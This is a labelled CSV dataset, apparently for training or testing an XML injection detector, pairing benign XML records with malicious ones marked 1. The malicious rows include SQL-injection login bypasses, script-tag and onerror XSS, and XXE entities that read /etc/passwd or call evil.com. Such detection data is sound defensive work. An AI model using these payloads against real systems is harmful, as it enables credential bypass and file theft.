payload,label
<data><value>42</value><unit>kg</unit></data>,0
<data><value>42</value><unit>kg</unit></data>,0
"<config><setting name=""theme"">dark</setting></config>",0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<config><setting name=""theme"">dark</setting></config>",0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<user><name>alice</name><password>secure123</password></user>,0
<login><username>john_doe</username><password>password123</password></login>,0
<profile><age>30</age><city>New York</city></profile>,0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
<user><name>alice</name><password>secure123</password></user>,0
<server><host>localhost</host><port>8080</port></server>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<config><setting name=""theme"">dark</setting></config>",0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<data><value>42</value><unit>kg</unit></data>,0
<profile><age>30</age><city>New York</city></profile>,0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
<profile><age>30</age><city>New York</city></profile>,0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<data><value>42</value><unit>kg</unit></data>,0
<server><host>localhost</host><port>8080</port></server>,0
<login><username>john_doe</username><password>password123</password></login>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
<user><name>alice</name><password>secure123</password></user>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<data><value>42</value><unit>kg</unit></data>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<login><username>john_doe</username><password>password123</password></login>,0
<user><name>alice</name><password>secure123</password></user>,0
"<config><setting name=""theme"">dark</setting></config>",0
<user><name>alice</name><password>secure123</password></user>,0
<profile><age>30</age><city>New York</city></profile>,0
<user><name>alice</name><password>secure123</password></user>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<server><host>localhost</host><port>8080</port></server>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
<profile><age>30</age><city>New York</city></profile>,0
<order><item>Phone</item><price>500</price></order>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<order><item>Phone</item><price>500</price></order>,0
<order><item>Phone</item><price>500</price></order>,0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<profile><age>30</age><city>New York</city></profile>,0
<login><username>john_doe</username><password>password123</password></login>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<config><setting name=""theme"">dark</setting></config>",0
<login><username>john_doe</username><password>password123</password></login>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<data><value>42</value><unit>kg</unit></data>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<profile><age>30</age><city>New York</city></profile>,0
<server><host>localhost</host><port>8080</port></server>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<user><name>alice</name><password>secure123</password></user>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
<user><name>alice</name><password>secure123</password></user>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<profile><age>30</age><city>&xxe;</city></profile>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
"<config><setting name=""theme"">dark</setting></config>",0
<user><name>alice</name><password>secure123</password></user>,0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<order><item>Phone</item><price>500</price></order>,0
<data><value>42</value><unit>kg</unit></data>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
<data><value>42</value><unit>kg</unit></data>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<user><name>alice</name><password>secure123</password></user>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<profile><age>30</age><city>New York</city></profile>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
<server><host>localhost</host><port>8080</port></server>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
<login><username>john_doe</username><password>password123</password></login>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<profile><age>30</age><city>New York</city></profile>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
<profile><age>30</age><city>New York</city></profile>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
"<config><setting name=""theme"">dark</setting></config>",0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<profile><age>30</age><city>New York</city></profile>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<login><username>john_doe</username><password>password123</password></login>,0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<profile><age>30</age><city>New York</city></profile>,0
<user><name>alice</name><password>secure123</password></user>,0
<order><item>Phone</item><price>500</price></order>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<profile><age>30</age><city>New York</city></profile>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<data><value>42</value><unit>kg</unit></data>,0
"<config><setting name=""theme"">dark</setting></config>",0
<login><username>john_doe</username><password>password123</password></login>,0
<login><username>john_doe</username><password>password123</password></login>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<config><setting name=""theme"">dark</setting></config>",0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
<order><item>Phone</item><price>500</price></order>,0
<server><host>localhost</host><port>8080</port></server>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<login><username>john_doe</username><password>password123</password></login>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<profile><age>30</age><city>New York</city></profile>,0
<server><host>localhost</host><port>8080</port></server>,0
<login><username>john_doe</username><password>password123</password></login>,0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<login><username>john_doe</username><password>password123</password></login>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<config><setting name=""theme"">dark</setting></config>",0
<data><value>42</value><unit>kg</unit></data>,0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
"<config><setting name=""theme"">dark</setting></config>",0
<server><host>localhost</host><port>8080</port></server>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<login><username>john_doe</username><password>password123</password></login>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<profile><age>30</age><city>New York</city></profile>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<order><item>Phone</item><price>500</price></order>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<data><value>42</value><unit>kg</unit></data>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<server><host>localhost</host><port>8080</port></server>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<user><name>alice</name><password>secure123</password></user>,0
<order><item>Phone</item><price>500</price></order>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<profile><age>30</age><city>New York</city></profile>,0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<data><value>42</value><unit>kg</unit></data>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<login><username>john_doe</username><password>password123</password></login>,0
<profile><age>30</age><city>New York</city></profile>,0
<data><value>42</value><unit>kg</unit></data>,0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
<user><name>alice</name><password>secure123</password></user>,0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<user><name>alice</name><password>secure123</password></user>,0
"<config><setting name=""theme"">dark</setting></config>",0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<order><item>Phone</item><price>500</price></order>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
<user><name>alice</name><password>secure123</password></user>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<user><name>alice</name><password>secure123</password></user>,0
<profile><age>30</age><city>New York</city></profile>,0
"<config><setting name=""theme"">dark</setting></config>",0
"<config><setting name=""theme"">dark</setting></config>",0
<user><name>alice</name><password>secure123</password></user>,0
"<config><setting name=""theme"">dark</setting></config>",0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<profile><age>30</age><city>New York</city></profile>,0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<login><username>john_doe</username><password>password123</password></login>,0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<server><host>localhost</host><port>8080</port></server>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
<user><name>alice</name><password>secure123</password></user>,0
<login><username>john_doe</username><password>password123</password></login>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<server><host>localhost</host><port>8080</port></server>,0
<server><host>localhost</host><port>8080</port></server>,0
<order><item>Phone</item><price>500</price></order>,0
"<config><setting name=""theme"">dark</setting></config>",0
<data><value>42</value><unit>kg</unit></data>,0
<user><name>alice</name><password>secure123</password></user>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<profile><age>30</age><city>New York</city></profile>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<order><item>Phone</item><price>500</price></order>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<user><name>alice</name><password>secure123</password></user>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<server><host>localhost</host><port>8080</port></server>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<order><item>Phone</item><price>500</price></order>,0
<data><value>42</value><unit>kg</unit></data>,0
<server><host>localhost</host><port>8080</port></server>,0
<order><item>Phone</item><price>500</price></order>,0
"<config><setting name=""theme"">dark</setting></config>",0
<user><name>alice</name><password>secure123</password></user>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<profile><age>30</age><city>New York</city></profile>,0
"<config><setting name=""theme"">dark</setting></config>",0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<user><name>alice</name><password>secure123</password></user>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<server><host>localhost</host><port>8080</port></server>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<server><host>localhost</host><port>8080</port></server>,0
<server><host>localhost</host><port>8080</port></server>,0
<server><host>localhost</host><port>8080</port></server>,0
<data><value>42</value><unit>kg</unit></data>,0
"<config><setting name=""theme"">dark</setting></config>",0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<login><username>john_doe</username><password>password123</password></login>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<login><username>john_doe</username><password>password123</password></login>,0
<profile><age>30</age><city>New York</city></profile>,0
"<config><setting name=""theme"">dark</setting></config>",0
"<config><setting name=""theme"">dark</setting></config>",0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<login><username>john_doe</username><password>password123</password></login>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
<user><name>alice</name><password>secure123</password></user>,0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<profile><age>30</age><city>New York</city></profile>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<server><host>localhost</host><port>8080</port></server>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<login><username>john_doe</username><password>password123</password></login>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<order><item>Phone</item><price>500</price></order>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<user><name>alice</name><password>secure123</password></user>,0
<server><host>localhost</host><port>8080</port></server>,0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<login><username>john_doe</username><password>password123</password></login>,0
<profile><age>30</age><city>New York</city></profile>,0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<data><value>42</value><unit>kg</unit></data>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<server><host>localhost</host><port>8080</port></server>,0
<data><value>42</value><unit>kg</unit></data>,0
<order><item>Phone</item><price>500</price></order>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
<data><value>42</value><unit>kg</unit></data>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<data><value>42</value><unit>kg</unit></data>,0
<order><item>Phone</item><price>500</price></order>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
<order><item>Phone</item><price>500</price></order>,0
<user><name>admin</name><password>' OR '1'='1</password></user>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<config><setting name=""theme"">dark</setting></config>",0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<user><name>alice</name><password>secure123</password></user>,0
<profile><age>30</age><city>New York</city></profile>,0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<user><name>alice</name><password>secure123</password></user>,0
<profile><age>30</age><city>New York</city></profile>,0
<login><username>john_doe</username><password>password123</password></login>,0
<data><value>42</value><unit>kg</unit></data>,0
<profile><age>30</age><city>New York</city></profile>,0
<data><value>42</value><unit>kg</unit></data>,0
<data><value>42</value><unit>kg</unit></data>,0
<profile><age>30</age><city>&xxe;</city></profile>,1
<login><username>john_doe</username><password>password123</password></login>,0
<order><item>Phone</item><price>500</price></order>,0
<order><item>Phone</item><price>500</price></order>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<profile><age>30</age><city>&xxe;</city></profile>,1
<data><value>42</value><unit>kg</unit></data>,0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<server><host>localhost</host><port>8080</port></server>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<data><value>42</value><unit>kg</unit></data>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<order><item>Phone</item><price>500</price></order>,0
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
<server><host>localhost</host><port>8080</port></server>,0
<data><value>42</value><unit>kg</unit></data>,0
<user><name>alice</name><password>secure123</password></user>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<order><item>Phone</item><price>500</price></order>,0
<server><host>localhost</host><port>8080</port></server>,0
"<config><setting name=""theme"">dark</setting></config>",0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
"<config><setting name=""theme"">dark"" onerror=""alert(1)""</setting></config>",1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<user><name>alice</name><password>secure123</password></user>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<config><setting name=""theme"">dark</setting></config>",0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<user><name>admin</name><password>' OR '1'='1</password></user>,1
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<user><name>alice</name><password>secure123</password></user>,0
<order><item>Phone</item><price>500</price></order>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user>&xxe;</user>",1
<data><value>42</value><unit>kg</unit></data>,0
"<login><username>john_doe</username><password>"" OR ""1""=""1</password></login>",1
<data><value>42</value><unit>kg</unit></data>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
"<config><setting name=""theme"">dark</setting></config>",0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<data><value>42</value><unit>kg</unit></data>,0
<order><item>Phone</item><price>500</price></order>,0
<order><item>Phone</item><price>500</price><discount>' OR '1'='1</discount></order>,1
<server><host>localhost</host><port>8080</port></server>,0
"<config><setting name=""theme"">dark</setting></config>",0
<profile><age>30</age><city>&xxe;</city></profile>,1
<profile><age>30</age><city>&xxe;</city></profile>,1
"<message><sender>bob</sender><text>Hello<script>alert(""XSS"")</script></text></message>",1
"<config><setting name=""theme"">dark</setting></config>",0
<login><username>john_doe</username><password>password123</password></login>,0
"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com"">]><user>&xxe;</user>",1
<data><value>42</value><unit>kg</unit></data>,0
<server><host>localhost</host><port>8080</port></server>,0
<order><item>Phone</item><price>500</price></order>,0
<user><name>alice</name><password>secure123</password></user>,0
"<message><sender>bob</sender><text>Hello, world!</text></message>",0
<user><name>alice</name><password>secure123</password></user>,0
<user><name>alice</name><password>secure123</password></user>,0
